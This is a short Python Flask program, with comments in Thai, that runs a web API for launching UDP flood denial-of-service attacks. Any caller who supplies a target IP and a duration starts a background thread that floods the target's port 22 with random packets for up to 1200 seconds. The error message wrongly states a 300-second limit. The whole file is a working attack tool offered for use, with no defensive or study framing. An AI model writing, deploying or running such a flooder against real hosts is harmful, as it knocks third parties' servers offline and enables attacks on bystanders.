from flask import Flask, request, jsonify
from datetime import datetime, timedelta
import socket
import random
import threading

app = Flask(__name__)

# ฟังก์ชันสำหรับ UDP Flood
def udp_flood(ip, duration):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        byte = random._urandom(1024)
        end_time = datetime.now() + timedelta(seconds=duration)
        attack_num = 0

        while datetime.now() < end_time:
            s.sendto(byte, (ip, 22))
            attack_num += 1
        s.close()
        print(f"Attack completed: {attack_num} packets sent to {ip}")
    except Exception as e:
        print(f"Error during attack: {e}")

# Route สำหรับ API
@app.route('/')
def api_udp_flood():
    # ดึงค่า IP และเวลาจากพารามิเตอร์
    target_ip = request.args.get('ip')
    duration = request.args.get('time')

    # ตรวจสอบว่าข้อมูลถูกส่งมาครบ
    if not target_ip or not duration:
        return jsonify({"error": "Please provide both 'ip' and 'time' parameters."}), 400

    try:
        # ตรวจสอบว่าระยะเวลาเป็นตัวเลข
        duration = int(duration)
        if duration < 1 or duration > 1200:
            return jsonify({"error": "Time must be between 1 and 300 seconds."}), 400

        # เริ่มต้นการโจมตีใน Thread ใหม่
        thread = threading.Thread(target=udp_flood, args=(target_ip, duration))
        thread.start()

        return jsonify({
            "message": f"UDP flood attack started on {target_ip} for {duration} seconds."
        }), 200
    except ValueError:
        return jsonify({"error": "Invalid time parameter. Must be an integer."}), 400

# เริ่มต้นเซิร์ฟเวอร์
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
